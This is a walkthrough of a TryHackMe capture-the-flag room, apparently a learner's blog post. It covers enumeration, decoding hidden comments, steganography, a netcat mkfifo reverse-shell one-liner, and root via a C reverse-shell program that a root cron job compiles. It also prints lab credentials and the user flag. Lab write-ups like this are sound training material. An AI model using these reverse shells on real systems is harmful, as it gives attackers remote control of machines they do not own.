<h1 align="center">The Blog Blog</h1>
<p align="center">2025, August 15<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>466</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Successfully hack into bobloblaw's computer</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/f40eb58c-ae86-4a46-b25f-3b48d57624ea"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/theblobblog">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/e6db0a83-3f62-44c9-844c-bfafcc9675fd"></p>

<br>
<br>

<h2 align="center">Enumeration</h2>
<p>
  
- Nmap: 22/ssh and 80/http open<br>
- Web port  80  .  Source Code . A : Base64 decoding, BrainFuck decoding, Knock 1 3 5, Nmap, Gobuster<br>
- Web port  80  .  Source Code . B :Base58 decoding<br>
- Web port 445  .  Source Code : discovered a passowrd<br>
- FTP port 21: downloaded files, extracted out.txt from cool.jpeg<br>
- Web port 445: discovered a key, >discovered username:password using CyberChef, logged in<br>
- Web port 8080: </p>

<h2 align="center">Lateral Movement</h2>
<p>
  
- Reverse shell<br>
- shell as www-data<br>
- reno.png and reno2.png : downloaded file reno.jpg and reno2.jpg, extracted dog.txt ad doggo.txt = rabbit hole<br>
- identified an active cronjob<br>
- checked the files owned by bobloblaw, downloaded binary, analyzed it with Ghidra, run the binary with specific paremeters
- shell as bobloblaw, discovered bobloblaw´s flag</p>

<h2 align="center">Privilege Escalation</h2>
<p>

- connected via SSH using bobloblaw´s SSH private key<br>
- lookatme.jpg and dontlookatthis.jpg: donwloaded, extracted whatscooking.txt and dontlook.txt = rabbit hole<br>
- checked bobloblaw´s privileges<br>
- executed pspy64 : discovered a root´s task compiled in c and executed every minute = .boring_file.c<br>
- there is write permission for .boring_file.c<br>
- substituted its content<br>
- set up a listener<br>
- waited one minute<br>
- shell as root<br>
- discovered root´s flag</p>

<br>
<br>

<h2>Task 1 . Root The Box</h2>
<p>Can you root the box?</p>

<br>
<p><em>Answer the questions below</em></p>


<h2 align="center">Enumeration</h2>
<br>
<h3>Nmap</h3>

<p>

- 22 : ssh<br>
- 80 : http</p>

<br>

```bash
:~/TheBlogBlog# nmap -sC -sV -p- -T4 xx.xxx.xxx.xxx
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```


<br>
<br>
<h3>Web port 80  .  Source Code . A</h3>

```bash
:~/TheBlogBlog# curl -s http://xx.xxx.xxx.xxx/ | head -n 11

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->
```

<br>

<h4>From Base64</h4>

```bash
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```

<br>

<h4>From BrainFuck: https://www.dcode.fr/brainfuck-language</h4>

```bash
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

<br>
<h4>Knock</h4>

```bash
:~/TheBlogBlog# knock xx.xxx.xxx.xxx 1 3 5
```

<br>
<br>
<h4>Nmap</h4>

```bash
:~/TheBlogBlog# nmap -p- xx.xxx.xxx.xxx
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds
5355/tcp open  llmnr
8080/tcp open  http-proxy
```

<br>
<br>
<h4>Gobuster</h4>

```bash
:~/TheBlogBlog# gobuster dir -u http://xx.xxx.xxx.xxx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/index.html           (Status: 200) [Size: 13312]
```

<br>

```bash
:~/TheBlogBlog# gobuster dir -u http://xx.xxx.xxx.xxx:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/user                 (Status: 200) [Size: 3401]
/server-status        (Status: 403) [Size: 295]
```

<br>

```bash
:~/TheBlogBlog# gobuster dir -u http://xx.xxx.xxx.xxx:5355 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

...
Error: error on running gobuster: unable to connect to http://xx.xxx.xxx.xxx:5355/: Get "http://xx.xxx.xxx.xxx:5355/": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

<br>

```bash
:~/TheBlogBlog# gobuster dir -u http://xx.xxx.xxx.xxx:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/blog                 (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/login                (Status: 200) [Size: 546]
/review               (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog1                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog2                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog3                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog4                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog5                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
/blog6                (Status: 302) [Size: 219] [--> http://xx.xxx.xxx.xxx:8080/login]
```

<br>
<br>
<h3>Web port 80  .  Source Code . B</h3>

<p>

- HcfP8J54AK4</p>

<br>

```bash
:~/TheBlogBlog# curl -s http://xx.xxx.xxx.xxx/ | tail -n 7
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
</html>

```

<h4>Base58 decode</h4>

```bash
cUpC4k3s
```

<br>
<br>
<h3>Web port 445  .  Source Code</h3>

<p>

- p@55w0rd</p>

<br>

```bash
:~/TheBlogBlog# curl -s http://xx.xxx.xxx.xxx:445/ | head -n 12

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
```

<br>
<br>
<h3>FTP</h3>

<img width="1178" height="800" alt="image" src="https://github.com/user-attachments/assets/1516392a-adcf-4d3b-bc1c-907bf8bb02ab" />

<br>
<br>
<h4>steghide</h4>

```bash
:~/TheBlogBlog# steghide extract -sf cool.jpeg
Enter passphrase: 
wrote extracted data to "out.txt".
```

<br>
<br>
<h4>out.txt</h4>

<p>

- zcv:p1fd3v3amT@55n0pr<br>
- /bobs_safe_for_stuff</p>

```bash
:~/TheBlogBlog# cat out.txt
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

<br>
<br>
<h3>xx.xxx.xxx.xxx:445/bobs_safe_for_stuff</h3>

<p>

- youmayenter</p>

<br>

```bash
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

<br>
<br>
<h3>CyberChef</h3>

<p>

- bob:d1ff3r3ntP@55w0rd</p>

<br>

<img width="1359" height="254" alt="image" src="https://github.com/user-attachments/assets/9fc2f3a1-e24e-4c0d-b92d-1315005204b8" />


<br>
<br>
<h3>xx.xxx.xxx.xxx:445/login</h3>
<br>

<img width="1057" height="123" alt="image" src="https://github.com/user-attachments/assets/5afae5d8-cb6f-4032-a32b-ab0b6205e0ab" />

<br>

<img width="1055" height="92" alt="image" src="https://github.com/user-attachments/assets/396bcd33-8be9-4cb7-a462-5f7f33f41c66" />

<br>

<p><em>whoami</em></p>

<img width="1064" height="471" alt="image" src="https://github.com/user-attachments/assets/839216fc-ba0f-469a-b350-441f92813836" />

<p><em>pwd</em></p>

<img width="1062" height="468" alt="image" src="https://github.com/user-attachments/assets/af49ce8b-d0fb-4d80-a81b-d1d5a8c88106" />

<p><em>ls /home</em></p>

<img width="1060" height="470" alt="image" src="https://github.com/user-attachments/assets/ac538c79-a0c8-41e7-bfba-0653658bb48d" />

<p><em>ls /home/bob</em>em></p>p>

<img width="1057" height="463" alt="image" src="https://github.com/user-attachments/assets/93a4206b-3258-49b2-805a-900347a358af" />

<p><em>cat /home/bob/examples.destop</em></p>

<img width="1063" height="799" alt="image" src="https://github.com/user-attachments/assets/3da519b0-1adb-4b63-afde-558de8c21b33" />

<br>
<h2 align="center">Lateral Movement</h2>
<br>
<h3>Reverse Shell</h3>

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xxx.xx.xxx 9001 >/tmp/f
```

<br>
<br>
<h3>Shell as www-data</h3>

```bash
:~/TheBlogBlog# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xxx.xxx 54020
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@bobloblaw-VirtualBox:~/html2$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~/TheBlogBlog# stty raw -echo; fg
nc -nlvp 9001

www-data@bobloblaw-VirtualBox:~/html2$ export TERM=xterm
www-data@bobloblaw-VirtualBox:~/html2$ You haven't rooted me yet? Jeez
pwd
/var/www/html2
```

<br>

```bash
www-data@bobloblaw-VirtualBox:/var/www$ ls
html  html2  html4  reno2.jpg  reno.jpg
```

<br>

```bash
www-data@bobloblaw-VirtualBox:/var/www$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
You haven't rooted me yet? Jeez
xx.xxx.xx.xxx - - [15/Aug/2025 xx:xx:xx] "GET /reno.jpg HTTP/1.1" 200 -
xx.xxx.xx.xxx - - [15/Aug/2025 xx:xx:xx] "GET /reno2.jpg HTTP/1.1" 200 -
```
<br>

```bash
:~/TheBlogBlog# wget http://xx.xxx.xx.xxx:8000/reno.jpg
...
reno.jpg                           100%[=============================================================>] 877.61K  3.24MB/s    in 0.3s    
```

<br>

<img width="443" height="646" alt="image" src="https://github.com/user-attachments/assets/121d9fdc-9c6f-48d3-b093-fda49a0a9894" />

<br>

```bash
:~/TheBlogBlog# wget http://xx.xxx.xx.xxx:8000/reno2.jpg
...
reno2.jpg                          100%[=============================================================>] 429.95K  --.-KB/s    in 0.09s   
```

<br>

<img width="444" height="646" alt="image" src="https://github.com/user-attachments/assets/dea6a1c2-6da8-4a75-b19c-bf0807c0a28d" />


<br>

```bash
:~/TheBlogBlog# steghide extract -sf reno.jpg
Enter passphrase: 
wrote extracted data to "dog.txt".
```

<br>

```bash
:~/TheBlogBlog# steghide extract -sf reno2.jpg
Enter passphrase: 
wrote extracted data to "doggo.txt".
```

<br>

<p>

- DOG</p>

<br>

```bash
:~/TheBlogBlog# cat dog.txt
i'm just a DOG, leave me alone
```
<br>


```bash
:~/TheBlogBlog# cat doggo.txt
jcug xue, paw W's vhooz pxgz Moxhr'y gcm.  Lt O fcaor ikcuvs gqczksx dbopor, L'r vuchdprb pk d fgepow, qac mux xavh lritg o xdphlh nrzk!
```

<br>
<br>
<h3>CyberChef</h3>

<img width="1354" height="260" alt="image" src="https://github.com/user-attachments/assets/35f54143-a07a-4920-96ad-76fe056d93eb" />

<br>

```bash
good job, but I'm still just Jared's dog.  If I could choose another animal, I'd probably be a rabbit, cuz you just found a rabbit hole!
```

<br>
<br>

```bash
www-data@bobloblaw-VirtualBox:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```


```bash
www-data@bobloblaw-VirtualBox:~/html2$ find / -type f -user bobloblaw 2>/dev/null
...
You haven't rooted me yet? Jeez
...
/usr/bin/blogFeedback
...
```

```bash
www-data@bobloblaw-VirtualBox:~/html2$ ltrace /usr/bin/blogFeeYou haven't rooted me yet? Jeez
dback
puts("Order my blogs!"Order my blogs!
)                          = 16
+++ exited (status 0) +++
```

<br>

<img width="1055" height="30" alt="image" src="https://github.com/user-attachments/assets/45f3578e-fb98-46d4-ae6f-78eac9dc9eeb" />


<br>
<br>

<p>

- downloaded blogFeedback<br>
- analyzed it with Ghidra</p>


<br>
<h3>Shell as bobloblaw</h3>

```bash
www-data@bobloblaw-VirtualBox:/tmp$ /usr/bin/blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ python3 -c "import pty; pty.spawn('/bin/bash')"
bobloblaw@bobloblaw-VirtualBox:/tmp$ id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
```

<br>

```bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ ls -lah
total 40K
drwxrwx---  3 bobloblaw bobloblaw 4.0K Jul 28  2020 .
drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 ..
-rw--w----  1 bobloblaw bobloblaw  11K Jul 24  2020 dontlookatthis.jpg
-rw--w----  1 bobloblaw bobloblaw  11K Jul 24  2020 lookatme.jpg
drwxrwx---  2 root      root      4.0K Jul 28  2020 .uh_oh
-rw--w----  1 bobloblaw bobloblaw  109 Jul 27  2020 user.txt
```

<br>
<h3>user.txt</h3>

```bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$
```

<br>

<p>1.1. User Flag<br>
<code>THM{C0NGR4t$_g3++ing_this_fur}</code></p>

<br>
<br>
<h2 align="center">Privilege Escalation</h2>

<h3>SSH</h3>

<br>


```bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/.ssh$ cat id_rsa
...
```

<br>

```bash
:~/TheBlogBlog# nano id_rsa
:~/TheBlogBlog# chmod 400 id_rsa
```

<br>

```bash
:~/TheBlogBlog# ssh -i id_rsa bobloblaw@theblogblog.thm
...
bobloblaw@bobloblaw-VirtualBox:~$
```

<br>

<img width="1123" height="97" alt="image" src="https://github.com/user-attachments/assets/615c0096-7b31-4541-98f1-bf621512985e" />

<br>


```bash
:~/TheBlogBlog# wget http://xx.xxx.xxx.xxx:8000/lookatme.jpg
...
lookatme.jpg        100%[===================>]  10.40K  --.-KB/s    in 0s      
```

<br>

```bash
:~/TheBlogBlog# wget http:/xx.xxx.xxx.xxx:8000/dontlookatthis.jpg
...
dontlookatthis.jpg  100%[===================>]  10.79K  --.-KB/s    in 0s      
```

<br>
<br>

<img width="576" height="332" alt="image" src="https://github.com/user-attachments/assets/0fc5046c-406d-4ecf-8486-c564ed0807a2" />

<br>
<br>

<img width="580" height="318" alt="image" src="https://github.com/user-attachments/assets/72e5e1bf-b146-490e-bc17-f3780963e949" />

<br>
<br>

```bash
:~/TheBlogBlog# steghide extract -sf lookatme.jpg
Enter passphrase: 
wrote extracted data to "whatscooking.txt".
```

<br>

```bash
:~/TheBlogBlog# cat whatscooking.txt
01001011 .............................
```

<br>

```bash
:~/TheBlogBlog# steghide extract -sf dontlookatthis.jpg
Enter passphrase: 
wrote extracted data to "dontlook.txt".
```

```bash
:~/TheBlogBlog# cat dontlook.txt 
NDkgMjAgNzQgNmYgNmMgNjQgMjAgNzkgNmYgNzUgMjAgNmUgNmYgNzQgMjAgNzQgNmYgMjAgNmMgNmYgNmYgNmIgMjE=
```

<br>

```bash
:~/TheBlogBlog# cat dontlook.txt | base64 -d
49 20 74 6f 6c 64 20 79 6f 75 20 6e 6f 74 20 74 6f 20 6c 6f 6f 6b 21
```

<br>

```bash
:~/TheBlogBlog#  cat dontlook.txt | base64 -d | xxd -r
told you not to
```

<br>
<br>
<h3>bobloblaw´s privileges</h3>

```bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ sudo -l
Matching Defaults entries for bobloblaw on bobloblaw-VirtualBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobloblaw may run the following commands on bobloblaw-VirtualBox:
    (root) NOPASSWD: /bin/echo, /usr/bin/yes
```

<br>

```bash
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ You haven't rooted me yet? Jeez
                                                                                       You haven't rooted me yet? Jeez
```

<br>
<br>
<h3>pspy64</h3>

```bash
bobloblaw@bobloblaw-VirtualBox:/dev/shm$ wget http://xx.xxx.xx.xxx:8000/pspy64
...
pspy64                                        100%[=================================================================================================>]   2.94M  --.-KB/s    in 0.006s  
```

<br>

```bash
bobloblaw@bobloblaw-VirtualBox:/dev/shm$ chmod +x pspy64
```

<br>

```bash
2025/08/15 xx:xx:xx CMD: UID=0    PID=6047   | /lib/systemd/systemd-cgroups-agent /system.slice/patch.service 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6054   | /usr/lib/gcc/x86_64-linux-gnu/6/cc1 -quiet -imultiarch x86_64-linux-gnu /home/bobloblaw/Documents/.boring_file.c -quiet -dumpbase .boring_file.c -mtune=generic -march=x86-64 -auxbase .boring_file -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccyhEZHO.s 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6053   | gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6052   | /bin/sh -c    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz * 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6051   | /bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/Documents/.also_boring/.still_boring 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6050   | /usr/sbin/CRON -f 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6049   | /usr/sbin/CRON -f 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6048   | /usr/sbin/CRON -f 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6060   | /bin/bash /root/.patch/patch.sh 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6058   | /bin/sh -c gzip 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6057   | /bin/bash /root/.patch/patch.sh 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6056   | tar -zcf /tmp/backup.tar.gz * 
2025/08/15 xx:xx:xx CMD: UID=0    PID=6055   | /bin/sh -c /root/.patch/patch.sh 
```


<br>
<br>
<h3>/home/bobloblaw/Documents/</h3>

```bash
bobloblaw@bobloblaw-VirtualBox:~/Documents$ ls -lah
total 16K
drwxr-xr-x  3 bobloblaw bobloblaw 4.0K Jul 30  2020 .
drwxrwx--- 16 bobloblaw bobloblaw 4.0K Aug  6  2020 ..
drwxrwx---  2 bobloblaw bobloblaw 4.0K Aug 15 16:28 .also_boring
-rw-rw----  1 bobloblaw bobloblaw   92 Jul 30  2020 .boring_file.c
```

<br>
<br>
<h3>.boring_file.c</h3>

```bash
bobloblaw@bobloblaw-VirtualBox:~/Documents$ cat .boring_file.c
#include <stdio.h>
int main() {
	printf("You haven't rooted me yet? Jeez\n");
	return 0;

}
```

<br>
<br>
<h3>.boring_file.c´s new content</h3>

```bash
/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "xx.xxx.xx.xxx"
#define REMOTE_PORT 4444

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```

<br>
<br>
<h3>Listener</h3>

```bash
:~/TheBlogBlog# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xxx.xxx 54758
```

<br>
<br>
<h3>Shell as root</h3>

```bash
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
```

<br>

```bash
cat root.txt
THM{**********************}
```

<br>

<p>1.2. Root Flag<br>
<code>THM{**********************}</code></p>

<br>
<br>

<img width="723" height="301" alt="image" src="https://github.com/user-attachments/assets/025b7ab0-a166-4aa3-9be6-619aee9b1e52" />

<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/390c0742-a7ed-4208-947d-4bf7cf0363b9"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/87a0dbd2-c165-40b0-808a-b2910f57f6c4"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 15   |   466    |     120ᵗʰ    |      5ᵗʰ     |     323ʳᵈ   |     8ᵗʰ    | 121,486  |    919    |    73     |


</div>


<p align="center">Global All Time:   120ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/79241340-bb26-4bba-bdb9-a73696a17c07"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/b76657b6-0a8f-4eab-b781-e3f73ceee723"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/5c4c05dc-da3c-4037-b995-c5bafdfb9e1d"><br>
                  Global monthly:    323ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/a1523fef-4a2e-49ab-a8b0-96a13ae494c0"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b3a95e2a-eeca-427e-bf89-bd64cb056b87"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
